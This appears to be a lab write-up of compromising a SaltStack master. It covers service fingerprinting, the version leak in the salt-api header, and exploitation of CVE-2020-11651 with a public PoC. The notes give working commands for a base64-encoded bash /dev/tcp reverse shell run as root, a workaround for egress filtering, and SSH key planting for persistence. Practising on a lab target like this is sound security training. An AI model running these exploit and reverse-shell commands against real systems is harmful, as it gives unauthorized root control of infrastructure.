Our IP:  192.168.45.166
Target IP: 192.168.111.62
nmap:
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)
53/tcp   open  domain  NLnet Labs NSD
80/tcp   open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Home | Mezzanine
4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0
8000/tcp open  http    nginx 1.16.1
|_http-server-header: nginx/1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-open-proxy: Proxy might be redirecting requests


```


ZeroMQ ZMTP Port 4506:
**ZMTP (ZeroMQ Message Transport Protocol)** is ==the formal wire protocol that dictates how ZeroMQ peers exchange messages, frames, and metadata over a transport layer like TCP==
	- Could be a service that uses this protocol. The service could store data related to the transfer like users or passwords or other info. 


SSH Port 22:
Good for connecting to users and dealing with transferring data

HTTP  Port 80:
	- check to see what we can observe on the webpage
	- Mezzanine could be the application name. if we find a version number we can later use for vuln hunting

http Port 8000:
Observe because it is accessible via the http service.

	-  X-Upstream	salt-api/3000-1
Here we can find the name of an application from which an api is using. Sometimes, version numbers can also be leaked. Look further into this apk and version number 

identified CVE from github

- https://github.com/advisories/GHSA-pjhf-vpx3-33r3
	Affected versions< 2019.2.4 >= 3000, < 3000.2

- https://github.com/jasperla/CVE-2020-11651-poc

---

## Service Fingerprint — it's a Salt master

The four "weird" ports are one product: **SaltStack** (config-management / remote-execution).
- `4505` = Salt master **publish** port (sends commands out to minions)
- `4506` = Salt master **return** port (collects results back)
- `8000` = **salt-api** — the HTTP/JSON front door to the master

Confirmed by curling 8000:
```bash
curl -i http://192.168.111.62:8000/
# {"clients": ["local","runner","wheel","ssh", ...], "return": "Welcome"}
# X-Upstream: salt-api/3000-1      <-- version leaked in the header
```
→ Version **3000** (the `-1` is just packaging). Falls inside the vulnerable range → **CVE-2020-11651** (auth bypass) + **CVE-2020-11652** (arbitrary file read/write).

---

## Exploitation — CVE-2020-11651 (auth bypass → RCE as root)

The PoC needs the `salt` python lib. Modern Kali blocks system pip → use a venv (see [[Python_venv]]):
```bash
git clone https://github.com/jasperla/CVE-2020-11651-poc ~/CVE-2020-11651-poc
python3 -m venv ~/exploit-venv
source ~/exploit-venv/bin/activate
pip install salt
```

Verify vuln + grab the root key (auth bypass):
```bash
python3 exploit.py --master 192.168.111.62
# [+] vulnerable to CVE-2020-11651... YES
# [*] root key obtained: ...
```

The `--exec` runs commands **as root** (salt-master runs as root). Reverse shell payload, base64-wrapped so `>&` / `/dev/tcp` survive being passed through `--exec` (see [[ReverseShells]]):
```bash
echo -n 'bash -i >& /dev/tcp/192.168.45.166/<PORT> 0>&1' | base64
python3 exploit.py --master 192.168.111.62 --exec "echo <BASE64> | base64 -d | bash"
```

---

## The catch — egress filtering

First attempt used callback port **4444** → exploit reported `Successfully scheduled job` but the shell **never connected**. The command ran (root key + job confirmed), so it wasn't an exploit failure — the box was **blocking outbound 4444** (egress filtering).

**Fix:** switched the callback to an allowed port. Re-encoded the payload with `LPORT=22`, set `nc -lvnp 22`, re-ran `--exec` → **shell connected as root.**

> Lesson: if an exploit clearly executes but the reverse shell never calls back, suspect egress filtering. Retry on a "normal" outbound port (22 / 443 / 53) before assuming the payload is broken. Alternative inbound route here: drop an SSH key into `/root/.ssh/authorized_keys` (via `--exec` or the CVE-2020-11652 file write) and `ssh root@target` — port 22 was open inbound.

---

## Result

- **Shell landed directly as `root`** — no privesc needed (salt-master runs as root).
- Flags:
```bash
cat /root/proof.txt
find / -name local.txt 2>/dev/null
```

## Key Takeaways

1. **Port fingerprint > generic checklist.** `4505 + 4506 + 8000` together = Salt master. Recognize the combo fast.
2. **Versions leak in headers** — `X-Upstream: salt-api/3000-1` handed us the version without any brute work.
3. **`--exec` runs as root** on a Salt master → straight to root, no escalation.
4. **Egress filtering** is the real reason a "working" exploit gives no shell — change the callback port before doubting the payload.
5. Mezzanine (port 80) was a **decoy/secondary** surface — Salt was the intended path.